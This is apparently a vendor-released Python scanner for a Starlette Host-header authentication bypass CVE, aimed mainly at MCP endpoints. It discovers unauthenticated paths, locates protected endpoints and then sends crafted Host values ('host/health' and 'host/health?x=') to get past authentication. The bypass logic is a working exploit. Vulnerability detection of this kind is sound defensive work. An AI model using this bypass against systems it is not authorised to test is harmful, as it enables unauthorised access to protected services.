#!/usr/bin/env python3
#
# CVE-2026-48710 — Starlette Host-Header Authentication Bypass Scanner
# X41 D-Sec GmbH — https://x41-dsec.de
#
# No external dependencies — Python 3.8+ stdlib only.
#
# MIT License
#
# Copyright (c) 2026 X41 D-Sec GmbH
#
# Permission is hereby granted, free of charge, to any person obtaining a copy
# of this software and associated documentation files (the "Software"), to deal
# in the Software without restriction, including without limitation the rights
# to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
# copies of the Software, and to permit persons to whom the Software is
# furnished to do so, subject to the following conditions:
#
# The above copyright notice and this permission notice shall be included in all
# copies or substantial portions of the Software.
#
# THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
# IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
# FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
# AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
# LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
# OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
# SOFTWARE.
"""CVE-2026-48710 — Starlette Host-Header Authentication Bypass Scanner.

Three-step detection:
  1. Discover unauthenticated (allowlisted) paths
  2. Discover protected endpoints (MCP or user-specified)
  3. Inject allowlisted paths into the Host header to bypass auth

Two bypass strategies:
  prefix:        Host: target.example.com/health
  query-absorb:  Host: target.example.com/health?x=

Usage:
    python scan_cve_2026_48710.py https://target.example.com
    python scan_cve_2026_48710.py http://target:8080 --mode generic \\
        --unauth /health --protected /admin/api
    python scan_cve_2026_48710.py https://target.example.com --json
"""

from __future__ import annotations

import argparse
import http.client
import json
import ssl
import sys
from urllib.parse import urlparse

BANNER = """\
\033[91m╔═══════════════════════════════════════════════════════════════╗
║\033[0m  CVE-2026-48710 — Starlette Host-Header Auth Bypass Scanner  \033[91m║
║\033[0m  X41 D-Sec GmbH — https://x41-dsec.de                       \033[91m║
╚═══════════════════════════════════════════════════════════════╝\033[0m"""

BANNER_PLAIN = """\
+---------------------------------------------------------------+
|  CVE-2026-48710 — Starlette Host-Header Auth Bypass Scanner   |
|  X41 D-Sec GmbH — https://x41-dsec.de                        |
+---------------------------------------------------------------+"""

MCP_INIT = json.dumps(
    {
        "jsonrpc": "2.0",
        "id": 1,
        "method": "initialize",
        "params": {
            "protocolVersion": "2025-06-18",
            "capabilities": {},
            "clientInfo": {"name": "cve-2026-48710-scanner", "version": "1.0"},
        },
    }
)

DEFAULT_MCP_PATHS = [
    "/mcp",
    "/mcp/",
    "/sse",
    "/sse/",
    "/messages",
    "/messages/",
    "/v1/mcp",
    "/v1/sse",
    "/v1/messages",
    "/api/mcp",
    "/api/sse",
    "/api/messages",
    "/api/v1/mcp",
    "/api/v1/sse",
    "/jsonrpc",
    "/rpc",
    "/server/mcp",
]

DEFAULT_UNAUTH_PATHS = [
    "/.well-known/oauth-protected-resource",
    "/.well-known/oauth-authorization-server",
    "/.well-known/openid-configuration",
    "/.well-known/jwks.json",
    "/.well-known/security.txt",
    "/health",
    "/healthz",
    "/healthcheck",
    "/ready",
    "/readyz",
    "/ping",
    "/status",
    "/openapi.json",
    "/docs",
    "/redoc",
    "/metrics",
    "/",
    "/favicon.ico",
    "/robots.txt",
    "/version",
    "/info",
]

# ---------------------------------------------------------------------------
# Terminal output helpers
# ---------------------------------------------------------------------------

_color = True
_quiet = False


def _c(code: str) -> str:
    return code if _color else ""


def _log(prefix: str, color: str, msg: str) -> None:
    if _quiet:
        return
    print(f"  {color}{prefix}{_c(chr(27) + '[0m')} {msg}", file=sys.stderr)


def info(msg: str) -> None:
    _log("[*]", _c("\033[94m"), msg)


def good(msg: str) -> None:
    _log("[+]", _c("\033[92m"), msg)


def warn(msg: str) -> None:
    _log("[!]", _c("\033[93m"), msg)


def fail(msg: str) -> None:
    _log("[-]", _c("\033[91m"), msg)


def vuln(msg: str) -> None:
    _log("[!]", _c("\033[1;91m"), msg)


def heading(msg: str) -> None:
    if _quiet:
        return
    print(f"\n{_c(chr(27) + '[1m')}{msg}{_c(chr(27) + '[0m')}", file=sys.stderr)


# ---------------------------------------------------------------------------
# HTTP layer — uses http.client to allow arbitrary Host header values
# ---------------------------------------------------------------------------


def http_request(
    host: str,
    port: int,
    use_tls: bool,
    method: str,
    path: str,
    host_header: str,
    body: str = "",
    timeout: int = 10,
) -> tuple[int | None, str]:
    conn = None
    try:
        if use_tls:
            ctx = ssl.create_default_context()
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE
            conn = http.client.HTTPSConnection(host, port, timeout=timeout, context=ctx)
        else:
            conn = http.client.HTTPConnection(host, port, timeout=timeout)

        headers = {
            "Host": host_header,
            "User-Agent": "cve-2026-48710-scanner/1.0 (X41 D-Sec)",
            "Accept": "application/json, text/event-stream",
            "Connection": "close",
        }
        encoded_body = None
        if body:
            headers["Content-Type"] = "application/json"
            encoded_body = body.encode()

        conn.request(method, path, body=encoded_body, headers=headers)
        resp = conn.getresponse()
        return resp.status, resp.read(256 * 1024).decode("utf-8", errors="replace")
    except Exception:
        return None, ""
    finally:
        if conn:
            conn.close()


def looks_like_mcp(body: str) -> bool:
    if '"protocolVersion"' in body:
        return True
    return '"jsonrpc"' in body and ('"result"' in body or '"error"' in body)


# ---------------------------------------------------------------------------
# Scan steps
# ---------------------------------------------------------------------------


def step1_find_unauth(
    host: str, port: int, use_tls: bool, paths: list[str], timeout: int
) -> list[tuple[str, int]]:
    heading("Step 1: Discovering unauthenticated paths")
    found: list[tuple[str, int]] = []
    for path in paths:
        status, _ = http_request(host, port, use_tls, "GET", path, host, timeout=timeout)
        if status is not None and 200 <= status < 400:
            good(f"{path} -> {status}")
            found.append((path, status))
    if found:
        info(f"Found {len(found)} reachable unauthenticated path(s)")
    else:
        warn("No unauthenticated paths found")
    return found


def step2_find_protected_mcp(
    host: str, port: int, use_tls: bool, paths: list[str], timeout: int
) -> tuple[list[tuple[str, int]], list[tuple[str, int]]]:
    heading("Step 2: Discovering protected MCP endpoints")
    protected: list[tuple[str, int]] = []
    open_eps: list[tuple[str, int]] = []
    for path in paths:
        status, body = http_request(
            host, port, use_tls, "POST", path, host, body=MCP_INIT, timeout=timeout
        )
        if status is None:
            continue
        is_mcp = looks_like_mcp(body)
        if status in (401, 403, 407) and not is_mcp:
            good(f"{path} -> {status} (protected)")
            protected.append((path, status))
        elif is_mcp and 200 <= status < 300:
            warn(f"{path} -> {status} (MCP open without auth)")
            open_eps.append((path, status))
    if protected:
        info(f"Found {len(protected)} protected MCP endpoint(s)")
    elif not open_eps:
        warn("No MCP endpoints found")
    return protected, open_eps


def step2_verify_protected(
    host: str, port: int, use_tls: bool, paths: list[str], timeout: int
) -> list[tuple[str, int]]:
    heading("Step 2: Verifying protected endpoints")
    protected: list[tuple[str, int]] = []
    for path in paths:
        status, _ = http_request(host, port, use_tls, "GET", path, host, timeout=timeout)
        if status in (401, 403, 407):
            good(f"{path} -> {status} (protected)")
            protected.append((path, status))
        elif status is not None:
            warn(f"{path} -> {status} (not protected)")
    if not protected:
        warn("No protected endpoints confirmed")
    return protected


def step3_try_bypass(
    host: str,
    port: int,
    use_tls: bool,
    unauth: list[tuple[str, int]],
    protected: list[tuple[str, int]],
    mode: str,
    timeout: int,
) -> list[dict]:
    heading("Step 3: Testing host-header bypass")

    strategies = [
        ("prefix", lambda h, p: f"{h}{p}"),
        ("query-absorb", lambda h, p: f"{h}{p}?x="),
    ]
    methods = ["POST"] if mode == "mcp" else ["GET", "POST"]
    total = len(unauth) * len(protected) * len(strategies) * len(methods)
    info(f"Testing {total} combination(s)...")

    bypasses: list[dict] = []
    for unauth_path, _ in unauth:
        for target_path, baseline in protected:
            for method in methods:
                for strat_name, make_host in strategies:
                    injected = make_host(host, unauth_path)
                    body = MCP_INIT if mode == "mcp" else ""

                    status, resp_body = http_request(
                        host, port, use_tls, method, target_path,
                        injected, body=body, timeout=timeout,
                    )
                    if status is None:
                        continue

                    bypassed = (
                        looks_like_mcp(resp_body)
                        if mode == "mcp"
                        else 200 <= status < 400
                    )

                    if bypassed:
                        vuln(
                            f"BYPASS {method} {target_path} via "
                            f"Host: {injected} -> {status} ({strat_name})"
                        )
                        bypasses.append(
                            {
                                "method": method,
                                "target_path": target_path,
                                "unauth_path": unauth_path,
                                "strategy": strat_name,
                                "host_header": injected,
                                "status": status,
                                "baseline_status": baseline,
                            }
                        )
    return bypasses


# ---------------------------------------------------------------------------
# Orchestrator
# ---------------------------------------------------------------------------


def scan(
    target: str,
    mode: str,
    unauth_paths: list[str],
    mcp_paths: list[str],
    protected_paths: list[str],
    timeout: int,
) -> tuple[str, list[dict]]:
    parsed = urlparse(target)
    if parsed.scheme not in ("http", "https"):
        fail(f"Unsupported scheme: {parsed.scheme}")
        sys.exit(1)

    use_tls = parsed.scheme == "https"
    host = parsed.hostname
    port = parsed.port or (443 if use_tls else 80)

    info(f"Target: {target}")
    info(f"Mode:   {mode}")
    info(f"Host:   {host}:{port} ({'TLS' if use_tls else 'plain HTTP'})")

    # Step 1
    unauth = step1_find_unauth(host, port, use_tls, unauth_paths, timeout)
    if not unauth:
        return "no-allowlist-candidate", []

    # Step 2
    open_eps: list[tuple[str, int]] = []
    if mode == "mcp":
        protected, open_eps = step2_find_protected_mcp(host, port, use_tls, mcp_paths, timeout)
    else:
        protected = step2_verify_protected(host, port, use_tls, protected_paths, timeout)

    if not protected and not open_eps:
        return ("no-mcp-endpoint" if mode == "mcp" else "no-protected-endpoint"), []
    if not protected and open_eps:
        return "mcp-open-without-auth", []

    # Step 3
    bypasses = step3_try_bypass(host, port, use_tls, unauth, protected, mode, timeout)
    return ("vulnerable" if bypasses else "not-vulnerable"), bypasses


# ---------------------------------------------------------------------------
# CLI
# ---------------------------------------------------------------------------


def main() -> None:
    global _color, _quiet

    ap = argparse.ArgumentParser(
        description="CVE-2026-48710 — Starlette Host-Header Auth Bypass Scanner",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""\
examples:
  %(prog)s https://target.example.com
  %(prog)s http://localhost:8080 --mode mcp
  %(prog)s https://target.example.com --mode generic \\
      --unauth /health --protected /admin/api
  %(prog)s https://target.example.com --json

X41 D-Sec GmbH — https://x41-dsec.de""",
    )
    ap.add_argument("target", help="target URL (http:// or https://)")
    ap.add_argument(
        "--mode", choices=["mcp", "generic"], default="mcp",
        help="scan mode: 'mcp' auto-discovers MCP endpoints, "
             "'generic' tests user-supplied path pairs (default: mcp)",
    )
    ap.add_argument(
        "--unauth", action="append", default=[],
        help="unauthenticated path to test (repeatable, overrides defaults)",
    )
    ap.add_argument(
        "--mcp-path", action="append", default=[],
        help="MCP endpoint path to probe (repeatable, overrides defaults)",
    )
    ap.add_argument(
        "--protected", action="append", default=[],
        help="protected path for generic mode (repeatable, required for generic)",
    )
    ap.add_argument("--timeout", type=int, default=10, help="per-request timeout in seconds (default: 10)")
    ap.add_argument("--json", action="store_true", help="output results as JSON")
    ap.add_argument("--no-color", action="store_true", help="disable colored output")
    args = ap.parse_args()

    if args.no_color or not sys.stdout.isatty():
        _color = False
    if args.json:
        _quiet = True
    else:
        print(BANNER if _color else BANNER_PLAIN, file=sys.stderr)
        print(file=sys.stderr)

    if args.mode == "generic" and not args.protected:
        fail("Generic mode requires at least one --protected path")
        sys.exit(1)

    verdict, bypasses = scan(
        target=args.target,
        mode=args.mode,
        unauth_paths=args.unauth or DEFAULT_UNAUTH_PATHS,
        mcp_paths=args.mcp_path or DEFAULT_MCP_PATHS,
        protected_paths=args.protected,
        timeout=args.timeout,
    )

    if args.json:
        json.dump(
            {"target": args.target, "mode": args.mode, "verdict": verdict, "bypasses": bypasses},
            sys.stdout, indent=2,
        )
        print()
    else:
        print(f"\n{'=' * 55}", file=sys.stderr)
        if verdict == "vulnerable":
            vuln(f"VULNERABLE — {len(bypasses)} bypass(es) confirmed")
        elif verdict == "not-vulnerable":
            good("NOT VULNERABLE — no bypasses found")
        elif verdict == "mcp-open-without-auth":
            warn("MCP endpoint(s) already open without authentication")
        else:
            info(f"Result: {verdict}")
        print(file=sys.stderr)

    sys.exit(1 if verdict == "vulnerable" else 0)


if __name__ == "__main__":
    main()
